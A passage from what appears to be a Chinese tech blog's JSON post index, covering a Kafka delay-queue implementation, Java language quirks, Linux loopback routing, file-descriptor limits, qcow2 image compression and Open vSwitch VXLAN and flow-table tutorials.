consumer.pause(Collections.singletonList(topicPartition)); consumer.seek(topicPartition, consumerRecord.offset()); timed = true; break; } } if (timed) { lock.wait(); } } } while (!exit); } } 这段程序是基于SpringBoot 2.4.4版本和 kafka-client 2.7.0版本编写的一个单元测试，需要修改私有变量servers为kafka broker的地址。\n在启动程序后，向Topic delay-minutes-1 发送如以下格式的json字符串数据\n{ \u0026#34;topic\u0026#34;: \u0026#34;target\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;key1\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;value1\u0026#34; } 同时启动一个消费者监听topic target，在一分钟后，将会收到一条 key=\u0026ldquo;key1\u0026rdquo;, value=\u0026ldquo;value1\u0026quot;的数据。\n源代码地址\n还需要做什么？ 创建多个topic用于处理不同时间的延迟消息，例如delay-minutes-1 delay-minutes-5  delay-minutes-10 delay-minutes-15以提供指数级别的延迟时间，这样比一个topic要好很多，毕竟在顺序拉取消息的时候，有一条消息不满足条件，后面的将全部进行排队。\n","permalink":"https://typesafe.cn/posts/kafka-delay-queue/","summary":"基于kafka实现延迟队列 kafka作为一个使用广泛的消息队列，很多人都不会陌生，但当你在网上搜索“kafka 延迟队列”，出现的都是一些讲解时间轮或者只是提供了一些思路，并没有一份真实可用的代码实现，今天我们就来打破这个现象，提供一份可运行的代码，抛砖引玉，吸引更多的大神来分享。\n基于kafka如何实现延迟队列？ 想要解决一个问题，我们需要先分解问题。kafka作为一个高性能的消息队列，只要消费能力足够，发出的消息都是会立刻收到的，因此我们需要想一个办法，让消息延迟发送出去。\n网上已经有大神给出了如下方案：\n 在发送延迟消息时不直接发送到目标topic，而是发送到一个用于处理延迟消息的topic，例如delay-minutes-1 写一段代码拉取delay-minutes-1中的消息，将满足条件的消息发送到真正的目标主题里。  就像画一匹马一样简单。\n方案是好的，但是我们还需要更多细节。\n完善细节 问题出在哪里？\n问题出在延迟消息发出去之后，代码程序就会立刻收到延迟消息，要如何处理才能让延迟消息等待一段时间才发送到真正的topic里面。\n可能有同学会觉得很简单嘛，在代码程序收到消息之后判断条件不满足，就调用sleep方法，过了一段时间我再进行下一个循环拉取消息。\n真的可行吗?\n一切好像都很美好，但这是不可行的。\n这是因为在轮询kafka拉取消息的时候，它会返回由max.poll.records配置指定的一批消息，但是当程序代码不能在max.poll.interval.ms配置的期望时间内处理这些消息的话，kafka就会认为这个消费者已经挂了，会进行rebalance，同时你这个消费者就无法再拉取到任何消息了。\n举个例子：当你需要一个24小时的延迟消息队列，在代码里面写下了Thread.sleep(1000*60*60*24);，为了不发生rebalance，你把max.poll.interval.ms 也改成了1000*60*60*24，这个时候你或许会感觉到一丝丝的怪异，我是谁？我在哪？我为什么要写出来这样的代码？\n其实我们可以更优雅的处理这个问题。\nKafkaConsumer 提供了暂停和恢复的API函数，调用消费者的暂停方法后就无法再拉取到新的消息，同时长时间不消费kafka也不会认为这个消费者已经挂掉了。另外为了能够更加优雅，我们会启动一个定时器来替换sleep。，完整流程如下图，当消费者发现消息不满足条件时，我们就暂停消费者，并把偏移量seek到上一次消费的位置以便等待下一个周期再次消费这条消息。\nJava代码实现 import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.JsonNode; import com.fasterxml.jackson.databind.ObjectMapper; import org.apache.kafka.clients.consumer.*; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.TopicPartition; import org.apache.kafka.common.serialization.StringDeserializer; import org.apache.kafka.common.serialization.StringSerializer; import org.junit.jupiter.api.BeforeEach; import org.junit.jupiter.api.Test; import org.springframework.boot.test.context.SpringBootTest; import java.time.Duration; import java.util.*; import java.util.concurrent.ExecutionException; @SpringBootTest public class DelayQueueTest { private KafkaConsumer\u0026lt;String, String\u0026gt; consumer; private KafkaProducer\u0026lt;String, String\u0026gt; producer; private volatile Boolean exit = false; private final Object lock = new Object(); private final String servers = \u0026#34;\u0026#34;; @BeforeEach void initConsumer() { Properties props = new Properties(); props.","title":"基于kafka实现延迟队列"},{"content":"Java是一种广泛使用的计算机编程语言、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。\n1995年3月23日Sun公司发布了Java，至今已有近26年，可以说是一门十分成熟的开发语言了，但在某些不为人知的地方存在着一些意料之外的特性。\nJava的保留关键字 goto和const 在Java里面没有goto这个功能，但它作为保留字是无法当做变量来使用的，const也是同样。\nint goto = 0; int const = 0; 上面这两行代码的写法存在问题，无法正常编译通过。\nJava标签Label 上面说了在Java里面没有goto这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。\nouterLoop: while (true) { System.out.println(\u0026#34;I\u0026#39;m the outer loop\u0026#34;); int i = 0; while (true) { System.out.println(\u0026#34;I am the inner loop\u0026#34;); i++; if (i \u0026gt;= 3) { break outerLoop; } } } System.out.println(\u0026#34;Complete the loop\u0026#34;); // 输出 I\u0026#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works  } System.out.println(\u0026#34;world\u0026#34;); } // 输出 hello test: if (true) { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works \t} System.out.println(\u0026#34;world\u0026#34;); } // 输出 hello test: try { System.out.println(\u0026#34;hello\u0026#34;); if (true) { break test; // works \t} System.out.println(\u0026#34;world\u0026#34;); } finally { } // 输出 hello Integer的是否相等问题 日常开发使用到Java基本数据类型是不可避免的一件事，但它却包含了一些很容易犯错的点，踩过一些坑的同学可能了解Java基本包装类型的常量池技术，例如Integer就具有数值[-128，127] 的相应类型的缓存数据，但下面定义的4个变量是否相等你是否能说的出来呢？\nInteger i1 = 127; Integer i2 = Integer.valueOf(127); Integer i3 = Integer.parseInt(\u0026#34;127\u0026#34;); Integer i4 = new Integer(127); System.out.println(i1 == i2); // true System.out.println(i1 == i3); // true System.out.println(i2 == i3); // true  System.out.println(i4 == i1); // false System.out.println(i4 == i2); // false System.out.println(i4 == i3); // false   Integer i1 = 127; Java 在编译的时候会直接将代码优化为 Integer i1=Integer.valueOf(127);，从而使用常量池中的对象。\n  Integer i2 = Integer.valueOf(127); 会从Integer缓存中获取。\nInteger.valueOf源码如下。\n/** * 会从缓存数组中获取范围为[-128, 127]的值，如果没有就创建一个新的对象。 */ public static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); }   Integer.parseInt(\u0026quot;127\u0026quot;); 返回值是 int数字，在[-128, 127]范围的会从常量池中获取。\n  new Integer(127); 创建一个新的对象。\n  Integer对象的缓存值的大小范围是在[-128 127]区间。这意味着当我们在此数值范围内操作时，“==”比较能正常返回结果。但当数值不在此范围，对象相等的比较是否正常返回结果就很难说了。所以为了安全，在使用对象数值进行比较相等时，请使用“.equals()”，而不是依赖于“==”比较相等，除非你非常肯定这种做法没有错误。\n思考一个问题，当变量的数值均为128时会输出什么结果呢？\nDouble.MIN_VALUE 竟然不是负数？ 我们可能是受了太多Integer和Long的影响，理所当然的认为Double.MIN_VALUE应该是一个负数，但实际上Double.MIN_VALUE是非0非负的最小值4.9E-324，Float也是同样。如果你想要最小的Double类型的数字，请使用-Double.MAX_VALUE。\nSystem.out.println(Double.MAX_VALUE); // 1.7976931348623157E308 System.out.println(Double.MIN_VALUE); // 4.9E-324 System.out.println(Float.MAX_VALUE); // 3.4028235E38 System.out.println(Float.MIN_VALUE); // 1.4E-45 使用 for 做死循环？ 提到死循环大家都会想到while(true)，但还有另一种写法 for(;;)，在字节码层面他们会被编译为同样的内容，一些上古C/C++程序员写Java的时候还会使用for(;;)做死循环，遇到这样的朋友一定要珍惜哦。\nwhile (true){ // do something } for(;;){ // do something } 下划线也能当做变量？ Object _ = new Object(); System.out.println(_.toString()); 在Java8中还能使用下划线当做变量，但在Java9之后就标记为不再支持，请珍惜和它的最后这段时光吧。\nWTF!!! finally还能返回内容？ public class Finally { public int fun() { try { return 0; } finally { return 1; } } public static void main(String[] args) { Finally aFinally = new Finally(); System.out.println(aFinally.fun()); // 1  } } 面试的时候finally返回值坑了多少英雄好汉？\n一个类可以有几个static代码块？ public class Static { static { System.out.println(\u0026#34;hello\u0026#34;); } static { System.out.println(\u0026#34;world\u0026#34;); } static { System.out.println(\u0026#34;java\u0026#34;); } public static void main(String[] args) { } } // 输出 hello world java Java🐂🍺\nfinal 类型一定要声明的时候进行初始化吗？ 关于final类型的变量不可修改是每一个Java开发的常识，声明变量的时候就要对其进行初始化，但真的是这样的吗？\npublic class Final { public static void main(String[] args) { final int a; if (args != null) { a = 0; } else { a = 1; } System.out.println(a); // 0  } } 是否有点违背认知了？\n","permalink":"https://typesafe.cn/posts/java-unexpected-features/","summary":"Java是一种广泛使用的计算机编程语言、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。\n1995年3月23日Sun公司发布了Java，至今已有近26年，可以说是一门十分成熟的开发语言了，但在某些不为人知的地方存在着一些意料之外的特性。\nJava的保留关键字 goto和const 在Java里面没有goto这个功能，但它作为保留字是无法当做变量来使用的，const也是同样。\nint goto = 0; int const = 0; 上面这两行代码的写法存在问题，无法正常编译通过。\nJava标签Label 上面说了在Java里面没有goto这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。\nouterLoop: while (true) { System.out.println(\u0026#34;I\u0026#39;m the outer loop\u0026#34;); int i = 0; while (true) { System.out.println(\u0026#34;I am the inner loop\u0026#34;); i++; if (i \u0026gt;= 3) { break outerLoop; } } } System.out.println(\u0026#34;Complete the loop\u0026#34;); // 输出 I\u0026#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { System.","title":"Java的奇技淫巧"},{"content":"在开发或者调试时，我们经常需要和本地的服务器进行通信，例如启动nginx之后，在浏览器输入lcoalhost或者127.0.0.1就可以访问到本机上面的http服务。\nLinux是如何访问本机IP的？ 大多数操作系统都在网络层实现了环回能力，通常是使用一个虚拟的环回网络接口来实现。这个虚拟的环回网络接口看着像是一个真实的网卡，实际上是操作系统用软件模拟的，它可以通过TCP/IP与同一台主机上的其他服务进行通信，以127开头的IPv4地址就是为它保留的，主流Linux操作系统为环回网卡分配的地址都是127.0.0.1，主机名是localhost。\n环回网络接口之所以被称之为环回网络接口，是因为从本机发送到本机任意一个IP的数据报文都会在网络层交给环回网络接口，不再下发到数据链路层进行处理，环回网络接口直接发送回网络层，最终交由应用层软件程序进行处理。这种方式对于性能测试非常有用，因为省去了硬件的开销，可以直接测试协议栈软件所需要的时间。\n那环回网络接口是如何判断目的IP是否为本机地址的呢？\n答案就是网络层在进行路由转发的时候会先查本地的路由表，发现是本机IP后交给环回网络接口。查看本地路由表的命令如下：\nip route show table local 输出内容如下：\nbroadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 local 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 其中local开头的便是本地IP，dev后面是网卡名称。\n查完了本地路由表之后会再查主路由表，也就是我们经常操作的路由表。\nip route show table main 输出内容如下\ndefault via 10.141.128.1 dev eth0 proto static metric 100 10.141.128.0/18 dev eth0 proto kernel scope link src 10.141.155.131 metric 100 环回网络接口 现在我们再来看下环回网络接口\nifconfig lo 输出\nlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 1554227 bytes 123327716 (117.6 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1554227 bytes 123327716 (117.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 可以看到本地环回接口的IPv4地址是127.0.0.1，子网掩码是255.0.0.0，对应A类网络号127，有趣的是当我们访问 127.0.0.1-127.255.255.254之间的任意一个地址都会访问到本机。\nIPv6地址::1，前缀是128位，表示只有一个地址。\n环回网络接口的当前MTU是64KB，不过最高可以设置到2GB，真是恐怖如斯。\n下面几条RX,TX开头的分别代表收发到的数据报文个数和大小以及错包、丢包、溢出次数和无效帧。\nFAQ 虚拟网卡的IP属于本机IP吗？ 属于，因为与宿主机器共用同一个网络协议栈。\n宿主机器上创建netns，netns内部的IP属于本机IP吗？ 不属于，因为netns拥有独立的网络协议栈，在netns内部也可以看到它本身的环回网络接口。\n","permalink":"https://typesafe.cn/posts/linux-loopback/","summary":"在开发或者调试时，我们经常需要和本地的服务器进行通信，例如启动nginx之后，在浏览器输入lcoalhost或者127.0.0.1就可以访问到本机上面的http服务。\nLinux是如何访问本机IP的？ 大多数操作系统都在网络层实现了环回能力，通常是使用一个虚拟的环回网络接口来实现。这个虚拟的环回网络接口看着像是一个真实的网卡，实际上是操作系统用软件模拟的，它可以通过TCP/IP与同一台主机上的其他服务进行通信，以127开头的IPv4地址就是为它保留的，主流Linux操作系统为环回网卡分配的地址都是127.0.0.1，主机名是localhost。\n环回网络接口之所以被称之为环回网络接口，是因为从本机发送到本机任意一个IP的数据报文都会在网络层交给环回网络接口，不再下发到数据链路层进行处理，环回网络接口直接发送回网络层，最终交由应用层软件程序进行处理。这种方式对于性能测试非常有用，因为省去了硬件的开销，可以直接测试协议栈软件所需要的时间。\n那环回网络接口是如何判断目的IP是否为本机地址的呢？\n答案就是网络层在进行路由转发的时候会先查本地的路由表，发现是本机IP后交给环回网络接口。查看本地路由表的命令如下：\nip route show table local 输出内容如下：\nbroadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 local 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.1 dev lo proto kernel scope host src 127.","title":"Linux 环回网络接口"},{"content":"echo \u0026quot;fs.file-max=655350\u0026quot; \u0026gt;\u0026gt;/etc/sysctl.conf echo \u0026quot;* soft nofile 655350\u0026quot; \u0026gt;\u0026gt; /etc/security/limits.conf echo \u0026quot;* hard nofile 655350\u0026quot; \u0026gt;\u0026gt; /etc/security/limits.conf ulimit -n 655350 ","permalink":"https://typesafe.cn/posts/linux-limit/","summary":"echo \u0026quot;fs.file-max=655350\u0026quot; \u0026gt;\u0026gt;/etc/sysctl.conf echo \u0026quot;* soft nofile 655350\u0026quot; \u0026gt;\u0026gt; /etc/security/limits.conf echo \u0026quot;* hard nofile 655350\u0026quot; \u0026gt;\u0026gt; /etc/security/limits.conf ulimit -n 655350 ","title":"Linux 修改最大文件描述符"},{"content":"压缩qcow2 首先，需要对虚拟机剩余空间进行写零操作：\ndd if=/dev/zero of=/zero.dat 删除 zero.dat：\nrm /zero.dat 关闭虚拟机，执行qemu-img的convert命令进行转换：\nqemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2 ","permalink":"https://typesafe.cn/posts/qcow2-image-compression/","summary":"压缩qcow2 首先，需要对虚拟机剩余空间进行写零操作：\ndd if=/dev/zero of=/zero.dat 删除 zero.dat：\nrm /zero.dat 关闭虚拟机，执行qemu-img的convert命令进行转换：\nqemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2 ","title":"压缩qcow2 镜像文件"},{"content":"什么是VXLAN？ VXLAN是一种隧道封装协议，在三层网络上封装二层网络数据报文。简单来说就是可以在已经规划好网络拓扑的设备上封装出一个新的二层网络，因此VXLAN这类网络又被称之为overylay网络，底下承载VXLAN网络的就被称之为underlay网络。\nVXLAN解决了什么问题？ 最近几年，阿里云，腾讯云，京东云，华为云等等厂商每到节日都会打折出售大量云服务器，1核1G内存50G磁盘的服务器几十块就能买到一年的使用权，作为一个专业的羊毛党，哪个手里没有几台小破水管机器？但是这么多的云服务器是厂商如何做隔离的呢？了解过网络的同学或许会说VLAN。但是VLAN这种只能隔离4094个虚拟网络的技术别说满足不了羊毛党了，就连正常的用户估计都撑不住。那不隔离能行吗，厂商规划一个特别大的网段，让大家都在这里面耍，正常用户还好，万一这个时候进来一个大黑客，估计就会全部GG。\n因此，隔离是必不可少的，其中关键的技术就是overlay网络。\n那VXLAN具体解决了哪些问题呢？\n 突破了VLAN技术4094个隔离网络的限制，在一个管理域中创建多达1600万个VXLAN网络。 VXLAN提供了云服务厂商所需的规模的网络分段，以支持大量租户。 突破了物理网络边界的限制，传统虚拟二层网络（VLAN）是需要和物理网络做大量适配工作才能保证环境的迁移不会导致虚拟网络异常，overlay网络则不必关心底层物理网络是如何搭建的，只要能保证VXLAN端点相互之间可以联通即可。  VXLAN网络如何工作？ VXLAN隧道协议将二层以太网帧封装在三层UDP数据包中，使用户能够创建跨物理三层网络的虚拟化二层子网或网段。每个二层子网使用VXLAN网络标识符（VNI）作为唯一标识。报文格式如下图：\n执行数据包封装和解封装的实体称为VXLAN隧道终结点（VTEP）。VTEP主要分为两类：硬件VTEP和软件VTEP。硬件VTEP我接触较少，这里就不再介绍了。\n软件VTEP如下图所示：VTEP在数据包到达虚拟机之前进行了封装和解封装，使得虚拟机完全不需要知道VXLAN隧道以及它们之间的三层网络。\n简单VXLAN实验 我们参照下图完成实验。\n主机A # 创建隧道网桥 ovs-vsctl add-br br-tun # 创建隧道端口并指定远端IP和VXLAN ID ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111 # 创建内部端口 ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal # 创建netns用于模拟虚拟网络设备 ip netns add ns0 # 将内部端口移动到netns中 ip link set vnet0 netns ns0 # 启动网卡 ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up # 配置IP ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0 主机B # 创建隧道网桥 ovs-vsctl add-br br-tun # 创建隧道端口并指定远端IP和VXLAN ID ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111 # 创建内部端口 ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal # 创建netns用于模拟虚拟网络设备 ip netns add ns0 # 将内部端口移动到netns中 ip link set vnet0 netns ns0 # 启动网卡 ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up # 配置IP ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0 测试 在主机A上测试网络连通性 ip netns exec ns0 ping 192.168.0.2\nPING 192.168.0.2 (192.168.0.2) 56(84) bytes of data. 64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.715 ms 64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.372 ms 64 bytes from 192.168.0.2: icmp_seq=3 ttl=64 time=0.205 ms 64 bytes from 192.168.0.2: icmp_seq=4 ttl=64 time=0.230 ms ^C --- 192.168.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 111ms rtt min/avg/max/mdev = 0.205/0.380/0.715/0.204 ms 可以看到我们只使用一张网卡就成功的在已有的物理网络上建立了一个新的分布式二层网络。\n 在这个实验中我使用了固定的VXLAN ID 1111，只是为了简化实验，无其他含义。\n 当我们此时在主机B上对物理网卡eth0使用tcpdump抓包时。\ntcpdump -l -n -vv -i eth0 \u0026#39;port 4789 and udp[8:2] = 0x0800 \u0026amp; 0x0800 and udp[11:4] = 1111 \u0026amp; 0x00FFFFFF\u0026#39; 可以看到类似我下面截取的数据包。\n09:09:59.080604 IP (tos 0x0, ttl 64, id 12981, offset 0, flags [DF], proto UDP (17), length 134) 192.168.123.231.59648 \u0026gt; 192.168.123.232.vxlan: [no cksum] VXLAN, flags [I] (0x08), vni 1111 IP (tos 0x0, ttl 64, id 29815, offset 0, flags [DF], proto ICMP (1), length 84) 192.168.0.1 \u0026gt; 192.168.0.2: ICMP echo request, id 1928, seq 1, length 64 这是一条完整的数据报文，只是格式化成了4行。\n前两行是underlay网络的报文，也就是底层承载网络。分别是：\n 底层协议 proto UDP (17) 包长度 length 134 源和目的地址 192.168.123.231.59648 \u0026gt; 192.168.123.232.vxlan VXLAN ID：vni 1111  后两行是overlay网络的报文，也就是我们的虚拟网络。分别是：\n 承载的协议是 proto ICMP (1) 包长度 length 84 源和目的地址 192.168.0.1 \u0026gt; 192.168.0.2  可以看出这些信息和我们的实验环境非常匹配，只有包大小不太一致，这是因为underlay网络的基础信息刚好占有了50个字节，不信你可以加一下上面的报文格式中的数字。\n最后也不要忘记清理实验环境。\n# 在主机A和B上都需要执行 ovs-vsctl del-br br-tun ip netns del ns0 ","permalink":"https://typesafe.cn/posts/ovs-learn-6/","summary":"什么是VXLAN？ VXLAN是一种隧道封装协议，在三层网络上封装二层网络数据报文。简单来说就是可以在已经规划好网络拓扑的设备上封装出一个新的二层网络，因此VXLAN这类网络又被称之为overylay网络，底下承载VXLAN网络的就被称之为underlay网络。\nVXLAN解决了什么问题？ 最近几年，阿里云，腾讯云，京东云，华为云等等厂商每到节日都会打折出售大量云服务器，1核1G内存50G磁盘的服务器几十块就能买到一年的使用权，作为一个专业的羊毛党，哪个手里没有几台小破水管机器？但是这么多的云服务器是厂商如何做隔离的呢？了解过网络的同学或许会说VLAN。但是VLAN这种只能隔离4094个虚拟网络的技术别说满足不了羊毛党了，就连正常的用户估计都撑不住。那不隔离能行吗，厂商规划一个特别大的网段，让大家都在这里面耍，正常用户还好，万一这个时候进来一个大黑客，估计就会全部GG。\n因此，隔离是必不可少的，其中关键的技术就是overlay网络。\n那VXLAN具体解决了哪些问题呢？\n 突破了VLAN技术4094个隔离网络的限制，在一个管理域中创建多达1600万个VXLAN网络。 VXLAN提供了云服务厂商所需的规模的网络分段，以支持大量租户。 突破了物理网络边界的限制，传统虚拟二层网络（VLAN）是需要和物理网络做大量适配工作才能保证环境的迁移不会导致虚拟网络异常，overlay网络则不必关心底层物理网络是如何搭建的，只要能保证VXLAN端点相互之间可以联通即可。  VXLAN网络如何工作？ VXLAN隧道协议将二层以太网帧封装在三层UDP数据包中，使用户能够创建跨物理三层网络的虚拟化二层子网或网段。每个二层子网使用VXLAN网络标识符（VNI）作为唯一标识。报文格式如下图：\n执行数据包封装和解封装的实体称为VXLAN隧道终结点（VTEP）。VTEP主要分为两类：硬件VTEP和软件VTEP。硬件VTEP我接触较少，这里就不再介绍了。\n软件VTEP如下图所示：VTEP在数据包到达虚拟机之前进行了封装和解封装，使得虚拟机完全不需要知道VXLAN隧道以及它们之间的三层网络。\n简单VXLAN实验 我们参照下图完成实验。\n主机A # 创建隧道网桥 ovs-vsctl add-br br-tun # 创建隧道端口并指定远端IP和VXLAN ID ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111 # 创建内部端口 ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal # 创建netns用于模拟虚拟网络设备 ip netns add ns0 # 将内部端口移动到netns中 ip link set vnet0 netns ns0 # 启动网卡 ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up # 配置IP ip netns exec ns0 ip addr add 192.","title":"Open vSwitch 入门实践（6）VXLAN实验"},{"content":"OpenvSwitch flow table 流表  OpenFlow（OF）被认为是第一个软件定义网络（SDN）标准之一。它最初在SDN环境中定义了通信协议，使SDN控制器能够与物理和虚拟的交换机和路由器等网络设备的转发平面直接进行交互，从而更好地适应不断变化的业务需求。\n 如果把OpenFlow控制器比作“大脑”，OVS流表就像是“大腿”一样接受来自“大脑”的指令，决定要向哪个方向前进。但OVS流表功能更加强大，在没有OpenFlow控制器时，也可以自主工作，它本身也供一些命令让我们可以直接管理流表。\n操作命令 查看流表规则 # 查看br-tun上的全部流表规则 ovs-ofctl dump-flows br-tun 添加或修改流表规则 ovs-ofctl add−flow／add−flows／mod−flows “流表匹配条件,actions=[动作1][,动作2…]” 如果你有过编程的经验，流表规则其实就是一个个简单的if语句，伪代码如下。\nif (流表匹配条件){ 动作1， 动作2... } if (流表匹配条件){ 动作1， 动作2... } 删除流表规则 # 删除br-tun上的全部流表规则 ovs-ofctl del-flows br-tun # 删除br-tun上匹配xx的全部流表规则 ovs-ofctl del-flows br-tun xx 流表匹配条件 OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:\n OVS匹配条件 OSI模型第二层【数据链路层】 OSI模型第三层【网络层】 OSI模型第四层【传输层】  OVS匹配条件 in_port=port 流量进入的端口编号或者名称，示例 in_port=br-int\ntable=number 规则保存的流表编号，范围是 0-254，默认值：0。\nOSI模型第二层【数据链路层】 dl 即是 data link 的缩写。\ndl_type=ethertype 匹配以太网协议类型以太类型，以10到65535之间的整数（包括0和65535）指定，以十进制或以0x前缀的十六进制数表示，示例如下。\n  dl_type=0x0800 匹配IPv4数据包，等同于dl_type=ip 。\n  dl_type=0x086dd 匹配IPv6数据包，等同于dl_type=ipv6 。\n  dl_type=0x0806 匹配ARP数据包，等同于dl_type=arp 。\n  dl_type=0x8035 匹配RARP数据包，等同于 dl_type=rarp。\n  dl_vlan=vlan 数据包的 VLAN Tag 值，范围是 0-4095，0xffff 代表不包含 VLAN Tag 的数据包\ndl_vlan_pcp=priority VLAN 优先级，取值区间为[0-7]。数字越大，表示优先级越高。\ndl_src=xx:xx:xx:xx:xx:xx dl_dst=xx:xx:xx:xx:xx:xx 源或目的的 MAC地址\n 地址01:00:00:00:00:00/01:00:00:00:00:00 代表广播 地址00:00:00:00:00:00/01:00:00:00:00:00 代表单播 地址fe:ff:ff:ff:ff:ff 匹配除多播位以外的所有位，基本上不会用到。 地址ff:ff:ff:ff:ff:ff 完全匹配（等同于省略子网掩码）。 地址00:00:00:00:00:00 匹配全部位（等同于 dl_dst=*）。  OSI模型第三层【网络层】 nw_src=ip[/netmask] nw_dst=ip[/netmask] 如果dl_type为0x0800（可能是通过简写形式，例如ip或tcp），则匹配IPv4源（或目标）地址ip，可以将其指定为IP地址或主机名（例如192.168.1.1或www.example.com）。可选的网络掩码允许将匹配限制为IPv4地址前缀。网络掩码可以指定为点分四边形（例如192.168.1.0/255.255.255.0）或CIDR块（例如192.168.1.0/24）。 Open vSwitch 1.8和更高版本支持任意点状四元掩码；早期版本仅支持CIDR掩码，即等效于某些CIDR块的虚线四边形。\n 当指定 dl_type为0x0800 或者ip时，匹配源或者目标的 IPv4 地址，可以将其指定为IP地址或主机名，例如192.168.1.1或www.typesafe.cn。同时也可以写作192.168.1.0/255.255.255.0或者192.168.1.0/24的形式。 当指定dl_type为0x0806或arp时，分别与IPv4和Ethernet的ARP数据包中的ar_spa或ar_tpa字段匹配。 当指定dl_type为0x8035或rarp时，分别与IPv4和Ethernet的RARP数据包中的ar_spa或ar_tpa字段匹配。 当指定dl_type为0x0800、0x0806或0x8035之外的其他值时，将忽略nw_src和nw_dst的值。  nw_proto=proto ipproto=proto  如果指定ip或dl_type=0x0800，则匹配IP协议类型proto，该协议类型被指定为0到255之间的十进制数（包括1和0，用于包含ICMP数据包或6以匹配TCP数据包）。 如果指定了ipv6或dl_type=0x86dd，则匹配IPv6标头类型原型，该形式指定为0到255之间的十进制数字（例如，包括58以匹配ICMPv6数据包或6以匹配TCP）。标头类型是设计文档中描述的终端标头。 当指定arp或dl_type=0x0806时，与ARP操作码的低8位匹配。大于255的ARP操作码被视为0。 指定rarp或dl_type=0x8035时，与ARP操作码的低8位匹配。大于255的ARP操作码被视为0。 当通配符dl_type或将其设置为0x0800、0x0806、0x8035或0x86dd之外的其他值时，将忽略nw_proto的值（请参见上面的流语法）。  nw_tos=tos 匹配IP ToS / DSCP或IPv6流量类别字段tos，该字段tos指定为0到255之间的十进制数字（包括0和255）。请注意，出于匹配目的，将忽略两个较低的保留位。\n当通配符dl_type或将其设置为0x0800或0x86dd之外的其他值时，将忽略nw_tos的值。\nip_dscp=dscp 匹配IP ToS / DSCP或IPv6流量类字段dscp，该字段指定为介于0和63之间（含0和63）的十进制数。\n当通配符dl_type或将其设置为0x0800或0x86dd之外的其他值时，将忽略ip_dscp的值（请参见上面的流语法）。\nnw_ecn=ecn ip_ecn=ecn 匹配IP ToS或IPv6流量类别字段中的ecn位，该ecn位指定为0到3（含0和3）之间的十进制数。当通配符dl_type或将其设置为0x0800或0x86dd之外的其他值时，将忽略nw_ecn的值（请参见上面的流语法）。\nnw_ttl=ttl 匹配IP TTL或IPv6跃点限制值ttl，该值指定为0到255之间的十进制数字（包括0和255）。\n当通配符dl_type或将其设置为0x0800或0x86dd之外的其他值时，将忽略nw_ttl的值（请参见上面的流语法）。\nOSI模型第四层【传输层】 tcp_src=port tcp_dst=port udp_src=port udp_dst=port sctp_src=port sctp_dst=port 匹配TCP，UDP或SCTP源端口或目标端口，端口号指定为0到65535（含0和65535）之间的十进制数。\n当通配符dl_type和nw_proto或将其设置为不表示适当协议的值时，这些设置的值将被忽略（请参见上面的流语法）。\ntcp_src=port/mask tcp_dst=port/mask udp_src=port/mask udp_dst=port/mask sctp_src=port/mask sctp_dst=port/mask 